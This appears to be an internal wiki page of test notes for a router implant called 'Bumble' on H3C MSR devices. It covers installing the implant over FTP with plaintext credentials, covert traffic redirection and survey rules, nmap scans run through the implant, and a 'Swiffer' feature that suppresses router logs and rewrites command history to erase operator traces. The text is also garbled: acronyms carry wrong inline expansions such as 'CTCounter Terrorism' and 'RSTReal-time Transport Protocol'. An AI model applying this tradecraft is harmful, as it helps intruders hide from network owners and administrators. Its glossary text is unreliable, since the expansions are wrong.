@@ -1,0 +1,581 @@
+
+                        Owner: User #14587667
+Bumble 3.0.0/3.1Beta Test Notes
+Test Summary
+
+Downloaded and installed Ubuntu Server 10.04. This is the library version that was delievered with Bumble.
+CT 2.4 which was delivered is not compatible with current ICON image (Debian 7.8)
+MTU settings
+CT MTUMaximum Transmission Unit setting can not go below 120 bytes.
+Egress from Atk setting delaysim MTU<=108 and CTCounter Terrorism MTU<128 allows CTCounter Terrorism to connect, but states "currenct packet size restrictions are incompatible with selected Score protocol".
+Ingress to Atk MTU<=508Bytes.
+
+
+Score requires a minimum MTUMaximum Transmission Unit of 480Bytes for return traffic (from implant to CTCounter Terrorism).  
+Flux will not be used with this tool so it will not be tested with flux.
+
+
+Progress/Notes
+
+Sample survey commands:
+tp survey create 192.0.0.0 255.0.0.0 0 0.0.0.0 0.0.0.0 0 icmp -en
+tp survey create 192.0.0.0 255.0.0.0 0 0.0.0.0 0.0.0.0 0 tcp -en
+
+
+Sample redirection rule:redir create 10.1.243.2 255.255.255.255 0 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 255.255.255.255 0 0 tcp 10.1.243.2 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 0 0 -en
+
+Sample traffic shaping:
+sudo tc qdisc add dev eth0 root netem delay 2.5s 0.5s loss 25% 25% duplicate 2% corrupt 3% reorder 25% 50%
+sudo ip link set eth0 mtu 128
+
+
+
+
+
+ID
+Status
+Task
+
+
+2
+complete
+Potential bug:
+Add survey and redir rule.
+redir create 10.1.243.2 255.255.255.255 0 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 255.255.255.255 0 0 tcp 10.1.243.2 0 XXX.X.XXX.XXX (JUMPSTART-5[US]) 0 0 -en
+tp survey create XXX.X.XXX.X (JUMPSTART-5[US]) 255.255.255.0 0 0.0.0.0 0.0.0.0 0 tcp -en
+
+
+Test redir.
+Run Ixia test.
+Test redir.  If redir fails, then re-try this sequence, but this time without adding the survey rules.  I wonder if the survey transaction log is filling causing the redir rule to stop working.  The translog stopped at index 4000 (is this coincidence or is this the size of the buffer?). A: This is how the score module is intended to work.
+
+
+
+
+
+
+ID
+Status
+Task
+
+
+16
+complete
+Potential Bug:  When running my expect script, copying the patch.bin file timed out.  Afterwards I attempted to reboot the H3C and it gave the belowmessage.  This occurred when I used the command "copy ftp://administrator:password@XXX.XXX.XXX.X (DNIC-RNET-192-100-100[US])/patch.bin patch.bin" to copy the patch file.  This is not the recommended way to copy the file.  No bug to report at this time.
+
+
+
+
+
+ID
+Status
+Task
+
+
+17
+complete
+Potential Bug: It appears that if the patch.bin file exists on cfa0: and you attempt to copy it again, it "copies" indefinitely.  Issuing the command "dir cfa0:" shows that the patch.bin file size is 0.  This may occurr when the patch file was incompletely applied.  This may have just occurred when I used the command "copy ftp://administrator:password@XXX.XXX.XXX.X (DNIC-RNET-192-100-100[US])/patch.bin patch.bin" to copy the patch file.  This is not the recommended way to copy the file.  No bug to report at this time.
+
+
+
+Tests
+
+Smoke Tests
+Install PBD and Establish CommsRefer to Bumble command script on share.
+
+
+Survey - ct_pt1-survey.exp
+Reboot DUT, install implant, establish comms via CT.
+Confirm implant is installed and activate score
+tp cmd "pbd probe"
+module show
+redir show
+module start score
+module show (confirm score is activated)
+redir show (there should be no rules)
+Add survey rule: tp survey create XXX.X.XXX.X (JUMPSTART-5[US]) 255.255.255.0 0 0.0.0.0 0.0.0.0 0 tcp -en
+redir show
+<sleep for 20 seconds to allow time to survey>
+Retrieve trans table: tp showtrans
+quit
+
+Successfully tested with the following Bumble versions: 
+Bumble 3.0.0
+Bumble 3.1 Beta (9/15/2015 w/o latency)
+
+
+
+
+Redirection - ct_pt2-redir.exp
+Reboot DUT, install implant, establish comms via CT.
+Confirm implant is installed and activate score (see Test 2 for commands to run)
+Add redir rule: redir create 192.168.254.6 255.255.255.255 0 0 XXX.XXX.X.XX (GB) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0
+Source IP/Mask: 192.168.254.6/32  - Atk VM
+Source Port Range: 0 0 (any)
+Destination IP/Mask: XXX.XXX.X.XX (GB)/32  - WWW3
+Destination Port Range: 0 0 (any)
+Protocol: TCP
+New Source IP:Port: 192.168.254.6:0  - Atk VM
+New Destination IP:Port: XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]):0  - WWW4
+TTL: 0 (don't change)
+
+Successfully tested with the following Bumble versions: 
+Bumble 3.0.0
+Bumble 3.1 Beta (9/16/15 w/o latency)
+
+
+
+
+Transaction Table rollover
+Reboot DUT, install implant, establish comms via CT.
+Start score: module start score
+Configure transtable aging time to 1 second: tp filter -t 1
+From Atk: wget --output-document=- http://XXX.XXX.X.XX (GB)Response should be from Bumble webserver #3 - XXX.XXX.X.XX (GB)
+
+
+Add redir rule: redir create 192.168.254.6 255.255.255.255 0 0 XXX.XXX.X.XX (GB) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+Test redir rule: wget --output-document=- http://XXX.XXX.X.XX (GB)Response should be from Bumble webserver #4 - XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US])
+
+
+Fill up transtable by running the "enterprise" profile on the Ixia.  Also add a survey rule: tp survey create 192.0.0.0 255.0.0.0 0 0.0.0.0 0.0.0.0 0 tcp -en
+Check if redir still functions correctly: wget --output-document=- http://XXX.XXX.X.XX (GB)
+
+Response should be from Bumble webserver #4 - XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US])
+
+To futher confirm, check transtable using the command "tp showtrans" and take a snapshow of the first 10 entries.
+Wait 10 seconds and check the transtable again.  Compare the first 10 entries with the snapshot you took.  The entries should be unique.  With the ixia running, enough entries should be created in a few seconds to cause the transtable to cycle.
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (9/23/15 w/o latency)
+
+
+
+Swiffer - Log Suppression
+Reboot DUT, install implant, establish comms via CT.Insure swiffer is inactive:  tp swiffer show
+
+Telnet to MSR and issue these commands:
+display this
+display users
+display tcp
+display logbuffer
+display history-command all
+These commands should appear in the logbuffer and history command
+
+
+Activate swiffer at the CTCounter Terrorism prompt
+tp swiffer activate
+tp swiffer show
+
+
+At the MSR console and telnet prompt:
+Confirm info-center is disabled:  display info-center
+display clock
+display ftp client source
+display interface brief
+display ip routing-table
+
+
+At the MSR console, issue thes commands
+Confirm recent commands were not logged to log buffer:  display logbuffer
+Confirm recent commands are logged to history:  display history-command all
+Disabling the info-center will not disable the command history logging.  This is the reason for a snapshot of the history command file to be saved.  The saved history file will overwrite this history when Swiffer is deactivated.
+This will also disable logging if a target admin issues commands.  There is no way to distinguish who is issuing the command.
+
+
+
+
+Deactivate Swiffer using CT.  Deactivating Swiffer restores the snapshot to the command history
+tp swiffer deactivate
+Wait 5 seconds and confirm swiffer is deactivated:  tp swiffer show
+
+
+At the MSR console and telnet prompt, confirm logs were removed
+display logbuffer
+display history-command all
+
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (9/25/15 w/o latency)
+
+
+
+
+Redir - Disable all rules then re-enable all rules
+Disable all redir rules:  redir disable 0
+Confirm rules disabled:  redir show
+Enable all redir rules:  redir enable 0
+Check that redir rules are working
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (w/o latency)
+
+
+
+
+
+Redirection Test - ACLAccess Control List circumventionNot plausible with current implant hook point
+
+Redirection Test (Lack of route on downstream router) 
+Single Rule - ct_pt3-redir.exp (script starts at step iv)
+Add default route to ASR:  ip route 0.0.0.0 0.0.0.0 XXX.XXX.XX.X (EU-MAP-5[US]) name To_MSR
+
+From atk VM, ping XXX.XXX.XX.X (EU-MAP-5[US]).  It should be successful.
+
+
+Remove default route from ASR:  no ip route 0.0.0.0 0.0.0.0 XXX.XXX.XX.X (EU-MAP-5[US]) name To_MSR
+
+From atk VM, ping XXX.XXX.XX.X (EU-MAP-5[US]).  It should fail.
+
+
+Add redir rule:  redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+
+From atk VM, ping XXX.XXX.XX.X (EU-MAP-5[US]). It should be successful.
+
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (9/16/2015 w/o latency)
+
+
+
+
+Multiple Rules
+
+Repeat steps from previous test.  Use the following rules:
+Loopback on ASR1002:  redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+
+WWW4 behind ASR:       redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+
+
+
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (9/17/2015 w/o latency)
+
+
+
+
+
+Redirection Test - Only specified protocol gets redirected
+Add redirection rule to allow TCPTransport Control Protocol from Atk VMVirtual Machine to WWW4 behind ASR:   redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 tcp XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+
+Retrieve webpage from Atk VM:   wget --output-document=- http://XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US])    This should successfully retreive the webpage.
+
+From Atk VM, ping XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]).  You should not get a ping response.
+
+Successfully tested with the following Bumble versions:Bumble 3.1 Beta (9/17/2015 w/o latency)
+
+
+
+Redirection Test - Lack of routes on MSRWhat would be a good scenario?
+
+Redirection Test - NMAPNetwork security scanner SYNFlag in TCP/IP Protocol Scan (all ports)
+Start IXIA traffic (??)
+Should not be able to ping XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]), .2, .10 (/24) from Atk VM
+Set the transtable to timeout after 1 second so that redir rules don't get disabled:  tp filter -t 1
+Add the following redir rules:  
+redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+
+
+You should not be able to ping XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]), .2, .10 (/24) from Atk VM:   sudo nmap -sP XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) --mtu 96 -stats-every 5m --min-rtt-timeout 7s
+Run the following nmap commands:Check for open services/ports:  sudo nmap -sV XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) --mtu 96 --stats-every 10m --min-rtt-timeout 7s
+
+
+BUM-6
+ Note: With latency, the ASRAzure Site Recovery (XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US])) is "down" according to nmap (-sP option).  With latency removed, it appears "up".
+
+
+
+Redirection Test - NMAPNetwork security scanner SYNFlag in TCP/IP Protocol Scan (< 15 ports) - ct_pt4-nmap.exp
+Start IXIA traffic (??)
+Should not be able to ping XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]), .2, .10 (/24) from Atk VM
+Set the transtable to timeout after 1 second so that redir rules don't get disabled:  tp filter -t 1
+Add the following redir rules:  
+redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+redir create 192.168.254.6 255.255.255.255 0 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 255.255.255.255 0 0 any XXX.XXX.XX.X (EU-MAP-5[US]) 0 XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) 0 0 -en
+
+
+You should not be able to ping XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]), .2, .10 (/24) from Atk VM:   sudo nmap -sP XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) --mtu 96 --stats-every 5m --min-rtt-timeout 7s
+Run the following nmap commands:Check for open services/ports:  sudo nmap -sS XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.X (EARTHLINKBUSINESS-BLK[US]) XX.XX.XXX.XX (EARTHLINKBUSINESS-BLK[US]) -p 21,22,23,25,53,80,110,443,3389 --mtu 96 --stats-every 10m --min-rtt-timeout 7s
+
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (10/1/2015 w/ and w/o latency)
+
+
+
+Swiffer (while redir rules enabled)
+Repeat redir test and leave it running.  
+Activate swiffer
+Connect to target via telnet and execute "dis run", "dis clock", and "dis ip rout"
+Disconnect from telnet session.
+Deactivate swiffer
+Inspect logfile and logbuffer for any traces of telnet connection
+
+
+Swiffer - Telnet failed during sessionConfirm all logs get deleted if there are two telnet open sessions but one session close.  It is assumed that swiffer will start and stop logging when the command is issued, but need to confirm.
+
+Swiffer - Info-Center gets enabled while Swiffer is active
+tp swiffer activate
+dis clock
+dis ip rout
+sys
+info-center enable
+dis users
+tp swiffer deactivate
+dis logbuffer
+
+
+Swiffer - UninstallLook for remnants ("comsn" and "telnetd")
+
+Redirection Test - MiTMNot applicable to JQJARGON.  Functionality not tested.
+
+Survey and Redirection used simultaneouslyThis is NOT recommended, so it will not be tested.
+
+Forensics Test - Inspect Netflow on SolarWinds
+Ad hoc test - ICON disconnected during PBD (patch) installation
+telnet 192.168.168.5  (admin/admin)
+ftp XXX.XXX.XXX.X (DNIC-RNET-192-100-100[US])  (administrator/password)
+ftp patch file to MSR.
+bin
+get patch.bin
+quit
+
+
+dir cfa0: !Confirm patch.bin was copied
+install activate patch cfa0:/patch.bin slot 0Before the patch completes, reboot the ICON VM.
+
+BUM-3
+
+
+Ad how test - Multiple reconnects to implant via CT
+This is related to BUM-5.  One time after disconnecting from a CTCounter Terrorism session, and then trying to reconnect an error occured.  continuously_reconnect_CT.exp was created to continuously connect to CT, wait 10 sec, disconnect, wait 10 sec, then repeat indefinitely.
+To setup the test, perform these steps:
+Start simulating delay on DelaySim VM: sudo ./set_delay.sh
+Open Atk Window 1, Ensure all tcpdump captures are closed. And then create a new capture:   sudo tcpdump -i eth0 -s 0 -w continuously_reconnect_CT.pcap
+
+Open Atk Window 2, and run the expect script which will continuously loop connecting then disconnecting:  sudo ./continuously_reconnect_CT.exp
+If you receive an error, the expect script should stop.  You will need to manually stop the pcap in Window 1 by pressing Ctrl-C.
+
+
+
+
+Reconfigured interface
+With implant installed, configure another gigabit interface.
+No observables
+
+Successfully tested with the following Bumble versions: Bumble 3.0.0
+
+
+
+Install PBD when PBD is already installed
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (10/7/2015 w/ latency)
+
+
+Re-attack after PBD already installed
+Reboot DUT, install implant, establish comms via CT, and run all tests:  date && sudo time ./reboot_target.exp && sudo ./install_and_run.sh
+Disconnect from CTCounter Terrorism session.
+Re-install implant and re-run all tests:  sudo ./install_and_run.sh
+Inspect 2nd round of test results to ensure tests were passed.  Only one instance of PBD is present.
+
+Successfully tested with the following Bumble versions: Bumble 3.1 Beta (10/13/2015 w/ latency)
+
+
+
+Forensics TestsInspect pcap
+UDP packets appear normal
+Most TCPTransport Control Protocol appears normal.Telnet connections cause a lot of red to appear, likely due to the unreliability of the connection (delay sim is running).  Telnet connections also receive a RSTReal-time Transport Protocol from the MSR periodically.  It seems the MSR (server) issues the RSTReal-time Transport Protocol packet to close the telnet session.
+
+
+
+
+Performance testing (IXIA)
+
+ 
+
+Add IXIA ports directly to MSR.  Need to determine IPs to use (look at config).
+Configure IXIA "hosts" to test connectivity to WWW1 and WWW2 (XXX.X.XXX.XXX (JUMPSTART-5[US]) & .112).
+Backup MSR config
+Copy off MSR f/w
+Upload MSR f/w
+
+ 
+Operator Notes
+
+Do not use survey and redirection at the same time.
+Disabling logging (using swiffer) will also disable logging for a target admin.
+Commands execute while swiffer is enabled will not be removed from the history until swiffer is deactivated.  Info-Center will also be disabled as long as swiffer is active.
+Add TP note about using Nmap with Score.
+How do we clear a kernel exception log should one occur?
+Once swiffer is stopped, it can not be restarted unless you re-install PBD.
+
+ 
+ 
+ToDo:
+
+
+ID
+Status
+Task
+
+
+14
+complete
+
+User #14587667 Delete default route on all routers (except MSR) after testbed complete (Not sure I should do this).  May just test redirection traversing an ACL.  Neighboring routers probably have routes back to the H3C, however secondary neighbors may not have routes back.  May be useful to re-configure testbed to have secondary routers that don't have routes back to H3C.  Deleted on all routers except 3845, 2811, and 2911
+
+
+15
+complete
+
+User #14587667 Get 2800 router from NDBNetwork Devices Branch Lab (R6/U27)
+
+
+6
+complete
+
+User #14587667 Put 1E1 HWIC in 2800 router
+
+
+7
+complete
+
+User #14587667 Setup SNMPSimple Network Management Protocol on solarwinds and configure MSR.
+
+
+8
+complete
+
+User #14587667 Setup loopbacks on MSR neighbor routes.  Use downstream IPs from MSR static routes.
+
+
+5
+complete
+
+User #14587667 Configure syslog server
+
+
+3
+complete
+
+User #14587667 Configure OSPFOpen Shortest Path First on MSR
+
+
+10
+complete
+
+User #14587667 Configure OSPFOpen Shortest Path First on Cisco (Grabe new router and use Gig int for OSPFOpen Shortest Path First - per target config).  Use IP 192.168.168.5/30 on MSR and 192.168.168.6 on Cisco.
+
+
+0
+complete
+
+User #14587667 Configure E1 links
+
+
+11
+complete
+
+User #14587667 Configure netstream on MSR interface to TRCore (in-/out-bound).
+
+
+12
+complete
+
+User #14587667 Configure netstream on MSR interface to 2911 (inbound).
+
+
+13
+complete
+
+User #14587667 Confirm netflow is being collect by SolarWinds
+
+
+1
+incomplete
+ 
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 
+| 24 
+| 25 
+| 26 
+| 27 
+| 28 
+| 29 
+| 30 
+| 31 
+| 32 
+| 33 
+| 34 
+| 35 
+| 36 
+| 37 
+| 38 
+| 39 
+| 40 
+| 41 
+| 42 
+| 43 
+| 44 
+| 45 
+| 46 
+| 47 
+| 48 
+| 49 
+| 50 
+| 51 
+| 52 
+| 53 
+| 54 
+| 55 
+| 56 
+| 57 
+| 58 
+| 59 
+| 60 
+| 61 
+| 62 
+| 63 
+| 64 
+| 65 
+| 66 
+| 67 
+| 68 
+| 69 
+| 70 
+| 71 
+| 72 
+| 73 
+| 74 
+| 75 
+| 76 
+| 77 
+| 78 
+| 79 
+| 80 
+| 81 
+| 82 
+| 83 
+|
+                    
